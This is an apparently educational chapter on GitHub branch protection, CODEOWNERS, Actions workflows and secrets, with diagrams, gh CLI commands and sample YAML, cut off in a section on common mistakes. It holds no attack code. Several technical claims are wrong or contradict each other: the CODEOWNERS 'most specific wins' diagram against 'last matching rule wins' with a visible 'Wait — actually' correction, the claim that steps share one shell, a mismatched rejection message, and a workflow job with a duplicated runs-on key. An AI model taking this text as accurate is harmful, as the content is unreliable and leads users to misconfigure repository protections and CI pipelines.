# Topic 24 — GitHub Advanced
## Branch Protection · CODEOWNERS · GitHub Actions · Secrets & Environments

---

## RULE 1 — ELI5 Anchor

Imagine a school project where anyone could walk up to the shared whiteboard and erase 
everyone else's work, or scribble nonsense over the final presentation. Chaos.

So the teacher puts three rules in place:

1. **You need two other students to approve your changes** before they get added to the final draft.
2. **If you touched the math section, Maya must approve it** — because she's the math expert.
3. **The robot assistant automatically checks your spelling** before your changes can even be considered.

That's GitHub Advanced in one paragraph:

| School Analogy | GitHub Reality |
|---|---|
| Final draft whiteboard | `main` branch |
| "Two students must approve" | Branch protection: required reviewers |
| "Maya must approve math changes" | CODEOWNERS: auto-assign reviewers by path |
| Robot spell checker | GitHub Actions: automated CI status checks |
| Teacher's gradebook (teacher only edits) | Protected branch: restrict who can push |
| Locking the whiteboard at night | Branch protection: no force-push, no deletion |
| Envelope with the robot's API key | GitHub Secrets: encrypted at rest, injected at runtime |

Branch protection + CODEOWNERS + Actions form a **three-layer quality gate** on every 
repository. Together they answer: "Who can change what, how is it validated, and who 
must approve it before it lands?"

---

## RULE 2 — Physical Architecture First

### Where GitHub's Rules Live (Server-Side, Not `.git/`)

Unlike hooks (Topic 19) which live in `.git/hooks/` on your local machine, GitHub's 
branch protection rules, CODEOWNERS, and Actions configurations live in two places:

**1. GitHub's database (server-side, not in your repo):**
```
GitHub servers
└── repository_settings
    ├── branch_protection_rules      ← stored in GitHub's PostgreSQL DB
    │   ├── rule: "main"
    │   │   ├── require_pull_request: true
    │   │   ├── required_approving_review_count: 2
    │   │   ├── require_status_checks: true
    │   │   ├── required_status_checks: ["ci/tests", "ci/lint"]
    │   │   ├── dismiss_stale_reviews: true
    │   │   ├── require_code_owner_reviews: true
    │   │   ├── allow_force_pushes: false
    │   │   └── allow_deletions: false
    │   └── rule: "release/*"
    │       └── ...
    ├── secrets                      ← encrypted with Libsodium, stored in DB
    │   ├── DATABASE_URL
    │   └── AWS_ACCESS_KEY_ID
    └── environments
        ├── production
        └── staging
```

**2. Files inside your repository (versioned like any other file):**
```
your-repo/
├── .github/
│   ├── CODEOWNERS                   ← owner rules (also works at root or /docs/)
│   ├── workflows/
│   │   ├── ci.yml                   ← triggered on push/PR
│   │   ├── deploy.yml               ← triggered on release/manual dispatch
│   │   └── reusable-build.yml       ← called by other workflows
│   ├── actions/
│   │   └── setup-node/
│   │       ├── action.yml           ← composite action definition
│   │       └── ...
│   ├── dependabot.yml               ← automated dependency update config
│   └── PULL_REQUEST_TEMPLATE.md     ← PR description template
├── .github/ISSUE_TEMPLATE/
│   ├── bug_report.md
│   └── feature_request.md
└── ...
```

### The GitHub Actions Runtime Architecture

When a workflow triggers, here is exactly what GitHub spins up:

```
GitHub Event Bus
│
│  push event fires (SHA: a1b2c3)
│
▼
GitHub Actions Orchestrator
│
├── Reads: .github/workflows/ci.yml
├── Parses YAML, resolves triggers
├── Creates workflow run (ID: 12345678)
│
▼
Job Queue
│
├── job: "test" → dispatched to runner pool
│   │
│   ▼
│   Runner VM (ubuntu-22.04)
│   ├── /home/runner/work/
│   │   └── <repo-name>/
│   │       └── <repo-name>/      ← your code is checked out here
│   │           ├── .git/
│   │           └── ... (your files)
│   ├── /home/runner/_work/_tool/ ← cached tools (Node, Python, etc.)
│   ├── /home/runner/_work/_temp/ ← temp files per step
│   └── GITHUB_ENV                ← file-based env variable passing between steps
│
└── job: "deploy" (needs: test) → waits in queue until "test" passes
```

### CODEOWNERS File Location Resolution Order

GitHub checks three locations, **in this order**, and uses the FIRST one found:

```
1. /CODEOWNERS           (repository root)
2. /.github/CODEOWNERS   (hidden github config dir — most common)
3. /docs/CODEOWNERS      (docs-only repos)
```

Only ONE CODEOWNERS file is active. If multiple exist, only the first location wins.

---

## RULE 3 — Exact Data Flow

### Data Flow 1: A Push Hits a Branch-Protected Branch

```
Developer runs: git push origin main

─────────────────────────────────────────────────────────────────────

STEP 1: Git sends pack data to GitHub via HTTPS/SSH
        ├── GitHub's git receive-pack process starts
        ├── Receives the ref update: refs/heads/main a1b2c3 → d4e5f6
        └── Before writing to disk, evaluates protection rules

STEP 2: GitHub queries branch protection rules for "main"
        ├── Rule exists? → YES
        ├── require_pull_request: true → FAIL
        │   └── This update came as a direct push, not via merged PR
        └── Response: HTTP 403 + error message

STEP 3: Git client receives the rejection
        OUTPUT:
        remote: error: GH006: Protected branch update failed for refs/heads/main.
        remote: error: Required status check "ci/tests" is failing.
        ! [remote rejected] main -> main (protected branch hook declined)
        error: failed to push some refs to 'https://github.com/org/repo.git'

─────────────────────────────────────────────────────────────────────
KEY POINT: The protection check happens server-side, BEFORE any object 
is written to the remote's .git/objects/. The pack data is discarded.
```

### Data Flow 2: A PR Triggers GitHub Actions

```
Developer opens a Pull Request: feature/login → main

─────────────────────────────────────────────────────────────────────

STEP 1: GitHub creates a synthetic merge commit SHA
        ├── Takes HEAD of main + HEAD of feature/login
        ├── Computes what the merge result would be
        └── Creates refs/pull/42/merge (a temporary ref, not a real branch)

STEP 2: GitHub emits "pull_request" event with action: "opened"
        Event payload includes:
        ├── pull_request.head.sha    ← the feature branch tip
        ├── pull_request.base.sha    ← current main tip  
        ├── pull_request.merge_commit_sha ← synthetic merge SHA
        └── repository.*, sender.*, installation.*

STEP 3: GitHub Actions orchestrator receives the event
        ├── Scans .github/workflows/ for files with trigger:
        │   on:
        │     pull_request:
        │       branches: [main]
        ├── Finds: ci.yml
        └── Creates workflow run #12345

STEP 4: Runner is allocated from the pool
        ├── Fresh VM is provisioned (ubuntu-22.04)
        ├── Docker image with base tools is applied
        └── Runner registers with GitHub job API

STEP 5: First step — actions/checkout
        ├── Runner calls GitHub API to get a short-lived GITHUB_TOKEN
        │   └── Scoped to: read contents + write checks (based on permissions:)
        ├── Performs: git clone + git checkout of the PR's merge commit
        └── Working dir: /home/runner/work/repo-name/repo-name/

STEP 6: Steps execute in order, inside the same runner shell
        ├── Each step runs in the SAME shell (environment persists)
        │   └── EXCEPT: environment variables exported via GITHUB_ENV
        ├── Failures: if exit code ≠ 0 → step fails → job fails (unless continue-on-error)
        └── Step outputs: written to GITHUB_OUTPUT file, read by subsequent steps

STEP 7: Job completes, runner reports result back to GitHub
        ├── GitHub updates the "check run" for this commit SHA
        ├── Branch protection sees: required check "ci/tests" → PASSED
        └── Merge button on the PR becomes available (if all other rules pass too)
```

### Data Flow 3: Secrets Injection

```
STEP 1: Workflow references a secret:
        env:
          DB_PASSWORD: ${{ secrets.DATABASE_URL }}

STEP 2: At runtime (not YAML parse time), GitHub:
        ├── Looks up the secret in its encrypted store
        ├── Decrypts using the repo's encryption key (Libsodium box)
        └── Injects the plaintext value into the runner's memory

STEP 3: The runner sets it as an environment variable
        ├── Value is NEVER written to disk
        ├── Value is MASKED in all log output (replaced with ***)
        └── Value is available to the step process as a real env var

STEP 4: If you accidentally echo the secret:
        run: echo $DB_PASSWORD
        OUTPUT: ***                ← GitHub's log scrubber masks it

STEP 5: Secret lifetime:
        ├── Injected at job start
        ├── Cleared when job ends
        └── NEVER passed to PRs from forks (security boundary — see below)
```

---

## RULE 4 — ASCII Architecture Diagrams

### Diagram 1: The Three-Layer Merge Gate

```
                    Developer pushes feature/login
                              │
                              ▼
                    ┌─────────────────────┐
                    │   Opens Pull Request │
                    │   feature → main     │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
              ▼                ▼                ▼
    ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐
    │   LAYER 1    │  │   LAYER 2    │  │     LAYER 3      │
    │  CI Status   │  │  CODEOWNERS  │  │  Branch Rules    │
    │   Checks     │  │   Reviews    │  │  (Final Gate)    │
    └──────┬───────┘  └──────┬───────┘  └────────┬─────────┘
           │                 │                   │
    GitHub Actions    Auto-assign owners   Require all checks
    runs tests/lint   based on changed     + N approvals +
    reports ✅/❌      files, block until   no unresolved
                      they approve         conversations
           │                 │                   │
           └────────────────►│◄──────────────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │  All gates ✅?  │
                    └────────┬────────┘
                             │
                    YES ──── Merge button
                    NO  ──── Blocked with reason
```

### Diagram 2: CODEOWNERS Path Resolution

```
Repository file tree:
├── frontend/
│   ├── src/
│   │   └── auth/
│   │       └── login.tsx      ← changed in PR
│   └── package.json
├── backend/
│   └── api/
│       └── users.py           ← changed in PR
└── .github/
    └── CODEOWNERS:

# .github/CODEOWNERS (read bottom-to-top for specificity)
*                    @org/all-reviewers      ← everyone owns everything (fallback)
*.py                 @org/backend-team       ← all Python files
backend/             @org/backend-team       ← entire backend dir
frontend/src/auth/   @alice @bob             ← auth module specialists
frontend/            @org/frontend-team      ← frontend dir

RESOLUTION for login.tsx:
Pattern matches (most specific wins):
  1. frontend/src/auth/ → @alice @bob         ← WINS (most specific path)
  2. frontend/          → @org/frontend-team
  3. *                  → @org/all-reviewers

→ @alice and @bob are auto-requested as reviewers

RESOLUTION for users.py:
Pattern matches:
  1. *.py              → @org/backend-team   ← WINS (more specific than *)
  2. backend/          → @org/backend-team   (same result here)
  3. *                 → @org/all-reviewers

→ @org/backend-team members are auto-requested as reviewers
```

### Diagram 3: GitHub Actions Job Dependencies

```
.github/workflows/ci.yml

on: [push, pull_request]

jobs:
  lint:         ──────────────────────────► runs immediately
  unit-tests:   ──────────────────────────► runs immediately (parallel with lint)
  build:        needs: [lint, unit-tests] ► waits for both to pass
  integration:  needs: build              ► waits for build
  deploy-staging: needs: integration ─────► waits for integration
                  environment: staging     (requires environment approval if configured)
  deploy-prod:  needs: deploy-staging ────► waits + requires manual approval
                environment: production

Timeline:
t=0     lint ────────────────► ✅ t=45s
t=0     unit-tests ──────────────────► ✅ t=90s
t=90s   build ────────────────────────────► ✅ t=3m
t=3m    integration ────────────────────────────────► ✅ t=6m
t=6m    deploy-staging ──────────────────────────────────► ✅ t=7m
t=7m    deploy-prod ──── ⏸ waiting for manual approval ────────► ✅ (after approval)
```

### Diagram 4: Secrets Scoping Hierarchy

```
GitHub Organization
│
├── ORG SECRETS (available to all repos in org, or selected repos)
│   ├── DATADOG_API_KEY
│   └── AWS_PROD_ROLE_ARN
│
├── Repository: frontend-app
│   ├── REPO SECRETS (override org secrets with same name)
│   │   ├── DATABASE_URL         ← repo-specific
│   │   └── AWS_ACCESS_KEY_ID    ← overrides org-level if same name
│   │
│   └── ENVIRONMENTS
│       ├── staging
│       │   └── ENV SECRETS
│       │       └── DATABASE_URL  ← overrides repo secret when job uses environment: staging
│       └── production
│           └── ENV SECRETS
│               └── DATABASE_URL  ← different value, only injected when environment: production
│
└── Repository: backend-api
    └── REPO SECRETS
        └── DATABASE_URL         ← completely separate from frontend-app's secret

OVERRIDE PRIORITY (highest wins):
  Environment Secret > Repository Secret > Organization Secret
```

### Diagram 5: GITHUB_TOKEN Permission Model

```
When a workflow runs, GitHub mints a short-lived JWT:

GITHUB_TOKEN
├── Issued by:  GitHub's auth service (github.com)
├── Audience:   This specific workflow run
├── Expiry:     Job lifetime (~6 hours max)
├── Scope:      Only this repository (cannot access other repos)
│
└── Default Permissions (can be lowered or raised per workflow/org):
    ├── contents:      read       ← clone, read files
    ├── checks:        write      ← create/update check runs
    ├── statuses:      write      ← commit status (legacy)
    ├── pull-requests: write      ← comment on PRs, set labels
    ├── issues:        write      ← comment, label, close
    ├── packages:      write      ← push to GitHub Packages
    ├── deployments:   write      ← create deployment records
    └── id-token:      none       ← OIDC token (must opt-in explicitly)
```

---

## RULE 5 — Hands-On Proof Commands

### Verify Branch Protection via GitHub CLI

```bash
# Install: https://cli.github.com
# Must run: gh auth login

# List all branch protection rules for a repo
gh api repos/{owner}/{repo}/branches/main/protection

# See which checks are required
gh api repos/{owner}/{repo}/branches/main/protection/required_status_checks

# Expected output fragment:
# {
#   "url": "...",
#   "strict": true,
#   "contexts": ["ci/tests", "ci/lint"],
#   "checks": [
#     { "context": "ci/tests", "app_id": 15368 },
#     { "context": "ci/lint",  "app_id": 15368 }
#   ]
# }
```

### Inspect a Workflow Run

```bash
# List recent workflow runs
gh run list --repo owner/repo --limit 5

# Get details of a specific run
gh run view 12345678

# Watch a run in real time
gh run watch 12345678

# Download run logs
gh run download 12345678

# Re-run a failed workflow
gh run rerun 12345678
```

### Test CODEOWNERS Locally

```bash
# See which owners would be assigned for changed files in your PR
# (Using GitHub CLI to simulate)
gh api repos/{owner}/{repo}/pulls/42/requested_reviewers

# View the parsed CODEOWNERS file (GitHub API)
gh api repos/{owner}/{repo}/contents/.github/CODEOWNERS \
  --jq '.content' | base64 -d
```

### Inspect Secrets (You Can't Read Values, But Can List Names)

```bash
# List secret names for a repo (not values — those are never retrievable)
gh secret list --repo owner/repo

# List org-level secrets
gh secret list --org my-org

# Set a secret from a file
gh secret set MY_SECRET --body "$(cat secret.txt)" --repo owner/repo

# Delete a secret
gh secret delete MY_SECRET --repo owner/repo
```

### Trigger a Workflow Manually

```bash
# workflow_dispatch trigger — run a workflow with inputs
gh workflow run deploy.yml \
  --repo owner/repo \
  --field environment=staging \
  --field version=v1.2.3

# List all workflows in the repo
gh workflow list --repo owner/repo
```

### View GitHub Actions Billing Usage

```bash
# Minutes used this billing period
gh api /repos/{owner}/{repo}/actions/billing/usage
```

---

## RULE 6 — Syntax Breakdown (Deep)

### Branch Protection Rule (via GitHub API / Rulesets)

```yaml
# GitHub REST API: PUT /repos/{owner}/{repo}/branches/{branch}/protection
{
  "required_status_checks": {
    "strict": true,            # ← branch must be up to date with base before merging
    "contexts": [],            # ← legacy status check names (deprecated, use checks[])
    "checks": [
      { "context": "ci/tests",  "app_id": 15368 },
      { "context": "ci/lint",   "app_id": 15368 }
    ]
  },
  "enforce_admins": true,      # ← applies rules even to admins (usually set false)
  "required_pull_request_reviews": {
    "dismissal_restrictions": {
      "users": ["alice"],      # ← only these users can dismiss stale reviews
      "teams": ["leads"]
    },
    "dismiss_stale_reviews": true,      # ← any new commit invalidates existing approvals
    "require_code_owner_reviews": true, # ← CODEOWNERS must approve their sections
    "required_approving_review_count": 2,  # ← minimum approved reviews needed
    "require_last_push_approval": true  # ← last pusher cannot be their own approver
  },
  "restrictions": {
    "users": [],               # ← whitelist of users who can push directly
    "teams": ["release-team"],
    "apps": []
  },
  "allow_force_pushes": false, # ← blocks git push --force on this branch
  "allow_deletions": false     # ← blocks git push origin :main or --delete
}
```

### CODEOWNERS Syntax

```
# CODEOWNERS file — each line: <pattern> <owner> [<owner>...]
# Patterns follow .gitignore rules (glob syntax)
# LAST MATCHING RULE WINS (unlike .gitignore, which is first-match)
# Wait — actually: GitHub docs say LAST matching rule wins for CODEOWNERS.

# ─── Pattern Types ───────────────────────────────────────────────
*                     @global-owner          # every file (catch-all)
#  └─ matches any file in any directory

*.js                  @js-team               # all JS files anywhere
#  └─ glob: any filename ending in .js

/docs/                @docs-team             # leading / = from repo root
#  └─ matches: /docs/index.md, /docs/api/readme.md
#  └─ does NOT match: /src/docs/

src/                  @backend-team          # no leading / = anywhere in tree  
#  └─ matches: /src/, /packages/src/, /apps/api/src/

apps/*/src/           @fullstack-team        # * matches one path segment
#  └─ matches: apps/api/src/, apps/web/src/
#  └─ does NOT match: apps/api/v2/src/ (too many segments for single *)

**/*.test.ts          @qa-team               # ** = any depth
#  └─ matches: foo.test.ts, src/auth/login.test.ts

# ─── Owner Types ─────────────────────────────────────────────────
*.py                  @alice                 # GitHub username (individual)
*.go                  @org/backend-team      # Team (format: @org/team-slug)
*.tf                  ops-lead@company.com   # Email (must be verified on GitHub account)

# ─── Multiple owners ─────────────────────────────────────────────
/deploy/              @alice @bob @org/devops   # ALL of these are requested

# ─── Negation (unown a path) ─────────────────────────────────────
# You CANNOT negate ownership — only add. 
# If you want exceptions, use more specific patterns after a broad one.
*.md                  @docs-team
README.md             @alice                 # overrides *.md for README.md specifically
```

### GitHub Actions Workflow Syntax

```yaml
# .github/workflows/ci.yml

name: CI Pipeline                # ← display name in GitHub UI
#      └─ any string, shown in "Actions" tab

on:                              # ← trigger definition
  push:                          # ← event type
    branches: [main, develop]    # ← only these branches trigger this event
    paths-ignore:                # ← skip if ONLY these paths changed
      - '**.md'
      - 'docs/**'
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
    # └─ "synchronize" = new commit pushed to PR branch
  schedule:
    - cron: '0 6 * * 1-5'        # ← weekdays at 6am UTC
  workflow_dispatch:             # ← manual trigger via UI or CLI
    inputs:
      environment:
        description: 'Target environment'
        required: true
        default: 'staging'
        type: choice
        options: [staging, production]
      debug_mode:
        description: 'Enable debug logging'
        type: boolean
        default: false

env:                             # ← workflow-level env vars (available to all jobs)
  NODE_VERSION: '20'
  REGISTRY: ghcr.io

jobs:                            # ← map of job-id → job definition
  lint:                          # ← job ID (used in "needs:" references)
    name: 'Lint & Format Check'  # ← display name (optional, defaults to job ID)
    runs-on: ubuntu-22.04        # ← runner label
    #          ├─ ubuntu-latest (avoid — version changes without warning)
    #          ├─ ubuntu-22.04, ubuntu-20.04
    #          ├─ windows-latest, macos-latest
    #          └─ self-hosted (your own runner)
    
    timeout-minutes: 10          # ← kill job if it exceeds this
    
    permissions:                 # ← override GITHUB_TOKEN permissions for this job
      contents: read
      checks: write
    
    steps:                       # ← ordered list of steps
      - name: Checkout code      # ← display name (optional but strongly recommended)
        uses: actions/checkout@v4
        #      ├─ "uses" = reference a pre-built action
        #      ├─ actions/ = GitHub's official org
        #      ├─ checkout = action name
        #      └─ @v4 = pin to a tag (SECURITY: pin to SHA for supply chain safety)
        with:                    # ← inputs to the action
          fetch-depth: 0         # ← 0 = full history (default: 1 = shallow)
          ref: ${{ github.head_ref }}
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'           # ← cache node_modules based on package-lock.json hash
      
      - name: Install dependencies
        run: npm ci              # ← "run" = shell command (bash on Linux/macOS, pwsh on Windows)
        # └─ multi-line:
        # run: |
        #   npm ci
        #   npm run validate
      
      - name: Run ESLint
        run: npm run lint
        env:                     # ← step-level env (overrides job-level and workflow-level)
          CI: true
      
      - name: Upload lint report  # ← upload artifacts to share between jobs or for download
        if: failure()            # ← conditional: only run if previous step failed
        uses: actions/upload-artifact@v4
        with:
          name: lint-report
          path: reports/lint.html
          retention-days: 7

  test:
    name: 'Unit Tests'
    runs-on: ubuntu-22.04
    needs: []                    # ← no dependencies, runs in parallel with lint
    
    strategy:                   # ← matrix: run this job multiple times with different configs
      fail-fast: false           # ← don't cancel other matrix jobs if one fails
      matrix:
        node: [18, 20, 22]
        os: [ubuntu-22.04, windows-latest]
    
    runs-on: ${{ matrix.os }}   # ← matrix variable reference
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      
      - run: npm ci && npm test
        env:
          DATABASE_URL: ${{ secrets.TEST_DATABASE_URL }}
          # └─ secret injection: encrypted → decrypted → injected → masked in logs

  deploy:
    name: 'Deploy to Production'
    runs-on: ubuntu-22.04
    needs: [lint, test]          # ← only runs if BOTH lint AND test jobs pass
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    environment: production      # ← activates environment protection rules + env secrets
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Configure AWS credentials (OIDC — no stored secrets!)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # └─ OIDC: GitHub gets a JWT → exchanges with AWS for temporary creds
          #    No AWS_ACCESS_KEY_ID stored as a secret!
      
      - name: Deploy
        run: ./scripts/deploy.sh
        env:
          ENVIRONMENT: production
          VERSION: ${{ github.sha }}
```

### GitHub Contexts Reference

```yaml
# The "github" context — always available in any workflow expression

${{ github.sha }}              # ← full 40-char SHA of the commit that triggered the run
${{ github.ref }}              # ← refs/heads/main or refs/pull/42/merge
${{ github.ref_name }}         # ← "main" or "feature/login" (short ref)
${{ github.event_name }}       # ← "push", "pull_request", "schedule", etc.
${{ github.actor }}            # ← username who triggered the run
${{ github.repository }}       # ← "owner/repo-name"
${{ github.repository_owner }} # ← "owner"
${{ github.workspace }}        # ← /home/runner/work/repo/repo (abs path to checkout)
${{ github.run_id }}           # ← unique ID for this workflow run
${{ github.run_number }}       # ← sequential number (1, 2, 3...) for this workflow
${{ github.job }}              # ← current job's ID
${{ github.event.pull_request.number }}  # ← PR number (event context varies by trigger)
${{ github.token }}            # ← the GITHUB_TOKEN JWT (same as secrets.GITHUB_TOKEN)

# The "env" context — workflow/job/step env vars
${{ env.NODE_VERSION }}        # ← references workflow-level env

# The "secrets" context — encrypted secrets
${{ secrets.MY_SECRET }}       # ← repo/org/env secret by name
${{ secrets.GITHUB_TOKEN }}    # ← the auto-generated GITHUB_TOKEN

# The "inputs" context — workflow_dispatch inputs
${{ inputs.environment }}      # ← value from manual trigger input

# The "needs" context — outputs from previous jobs
${{ needs.build.outputs.image_tag }}   # ← job output from the "build" job

# The "matrix" context — current matrix values
${{ matrix.node }}             # ← e.g., "20" in the current matrix combination

# The "runner" context
${{ runner.os }}               # ← "Linux", "Windows", "macOS"
${{ runner.temp }}             # ← temp directory for this job

# Expression operators available in ${{ }}:
# == != < <= > >= && || ! contains() startsWith() endsWith() format() join() toJSON() fromJSON()
```

---

## RULE 7 — Beginner → Production Example

### Beginner: Add a CI Check to Your Personal Project

```
SCENARIO: You have a Node.js project. You want tests to run on every push.

STEP 1: Create the workflow file
```

```bash
mkdir -p .github/workflows
```

```yaml
# .github/workflows/ci.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm test
```

```bash
git add .github/workflows/ci.yml
git commit -m "ci: add GitHub Actions test workflow"
git push origin main
# → Go to github.com/you/repo → Actions tab → watch it run
```

```
RESULT: Every push now runs tests. The green checkmark appears on commits.
Cost: $0 (public repos get unlimited minutes; private repos get 2000 min/month free)
```

---

### Production: Full CI/CD Pipeline for a Backend API Team

```
SCENARIO: 8-person backend team at a fintech startup.
  - main is the deployment branch (auto-deploys to staging)
  - Releases are tagged (deploys to production with approval)
  - Team policy: 2 reviews required, tests must pass, no force pushes
  - Infrastructure: AWS ECS, ECR (container registry)
  - Security: SAST scanning required before merge
```

**Step 1: Branch Protection (configured via GitHub UI or Terraform)**
```
Branch: main
Rules:
  ✅ Require pull request before merging
     - Required approving reviews: 2
     - Dismiss stale reviews when new commits are pushed
     - Require review from Code Owners
     - Restrict who can dismiss reviews: @org/tech-leads
  ✅ Require status checks to pass:
     - Require branches to be up to date before merging
     - Required checks:
       * "CI / Build & Test (20)"        ← job name from Actions
       * "CI / Security Scan"
       * "CI / Container Build"
  ✅ Require conversation resolution before merging
  ✅ Require signed commits
  ✅ Do not allow bypassing the above settings (apply to admins too)
  ✅ Restrict force pushes: nobody
  ✅ Restrict deletions: nobody
```

**Step 2: CODEOWNERS**
```
# .github/CODEOWNERS
*                           @my-org/backend-team

# Billing module — extra oversight
src/billing/                @alice @carlos @my-org/tech-leads

# Infrastructure as code
infrastructure/             @my-org/devops-team
*.tf                        @my-org/devops-team

# GitHub Actions workflows (meta: require ops approval to change CI itself)
.github/                    @my-org/devops-team @my-org/tech-leads

# Database migrations — any migration needs a DB expert
src/db/migrations/          @bob @my-org/dba-team
```

**Step 3: Full CI/CD Workflow**
```yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
    tags: ['v*.*.*']
  pull_request:
    branches: [main]

permissions:
  contents: read
  packages: write          # for pushing to GitHub Container Registry
  security-events: write   # for uploading SARIF (CodeQL results)
  id-token: write          # for OIDC AWS authentication

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    name: Build & Test (${{ matrix.node-version }})
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        node-version: [20]
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: testpassword
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

      - name: Run tests with coverage
        run: npm run test:coverage
        env:
          DATABASE_URL: postgresql://postgres:testpassword@localhost:5432/testdb
          NODE_ENV: test

      - name: Upload coverage report
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          fail_ci_if_error: true

  security-scan:
    name: Security Scan
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: javascript-typescript
          queries: security-extended     # more thorough than default

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:javascript-typescript"
          upload: true                   # uploads SARIF to GitHub Security tab

  container-build:
    name: Container Build
    runs-on: ubuntu-22.04
    needs: [test]
    outputs:
      image-tag: ${{ steps.meta.outputs.tags }}
      image-digest: ${{ steps.push.outputs.digest }}

    steps:
      - uses: actions/checkout@v4

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}  # auto-minted, no setup needed

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=sha-
            type=ref,event=branch
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}

      - name: Build and push Docker image
        id: push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-22.04
    needs: [test, security-scan, container-build]
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    environment:
      name: staging
      url: https://staging.api.myapp.com    # shown in GitHub UI

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC — no long-lived keys!)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_STAGING_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to ECS
        run: |
          aws ecs update-service \
            --cluster staging-cluster \
            --service backend-api \
            --force-new-deployment \
            --task-definition backend-api:$(
              aws ecs register-task-definition \
                --family backend-api \
                --container-definitions "[{
                  \"name\":\"api\",
                  \"image\":\"${{ needs.container-build.outputs.image-tag }}\",
                  \"essential\":true
                }]" \
                --query 'taskDefinition.revision' --output text
            )

  deploy-production:
    name: Deploy to Production
    runs-on: ubuntu-22.04
    needs: [deploy-staging]
    if: startsWith(github.ref, 'refs/tags/v')
    environment:
      name: production
      url: https://api.myapp.com
    # ↑ "production" environment has:
    #   - Required reviewers: @alice, @carlos (manual approval gate)
    #   - Wait timer: 5 minutes (rollback window)

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_PROD_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to production ECS
        run: ./scripts/deploy-production.sh
        env:
          IMAGE_TAG: ${{ needs.container-build.outputs.image-tag }}
          IMAGE_DIGEST: ${{ needs.container-build.outputs.image-digest }}

      - name: Create Sentry release
        run: |
          npx @sentry/cli releases new "${{ github.ref_name }}"
          npx @sentry/cli releases set-commits "${{ github.ref_name }}" --auto
          npx @sentry/cli releases finalize "${{ github.ref_name }}"
        env:
          SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
          SENTRY_ORG: my-org
          SENTRY_PROJECT: backend-api
```

**Step 4: Reusable Workflow (DRY)**
```yaml
# .github/workflows/reusable-deploy.yml
# Called by other workflows, not triggered directly

on:
  workflow_call:              # ← makes this a reusable workflow
    inputs:
      environment:
        required: true
        type: string
      image-tag:
        required: true
        type: string
    secrets:
      AWS_ROLE_ARN:           # ← caller passes their secret by reference
        required: true

jobs:
  deploy:
    runs-on: ubuntu-22.04
    environment: ${{ inputs.environment }}
    steps:
      - name: Deploy
        run: echo "Deploying ${{ inputs.image-tag }} to ${{ inputs.environment }}"
        # ...

# ─── Caller workflow uses it like this: ───
# jobs:
#   deploy:
#     uses: my-org/shared-workflows/.github/workflows/reusable-deploy.yml@main
#     with:
#       environment: production
#       image-tag: sha-abc123
#     secrets:
#       AWS_ROLE_ARN: ${{ secrets.PROD_ROLE_ARN }}
```

**Step 5: Dependabot Configuration**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
      day: monday
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 5
    labels:
      - dependencies
      - automated
    reviewers:
      - my-org/backend-team
    ignore:
      - dependency-name: "some-legacy-package"
        versions: [">=2.0.0"]   # ← pin to v1.x until we migrate

  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

---

## RULE 8 — Mistakes → Root Cause → Fix → Prevention

### MISTAKE 1: Storing Secrets in Workflow Files

**The mistake:**
```yaml
# ❌ CATASTROPHIC — This is committed to git history FOREVER
steps:
  - run: |
      curl -X POST https://api.stripe.com/v1/charges \
        -u sk_live_AbCdEfGhIjKlMnOpQrStUvWx:
```

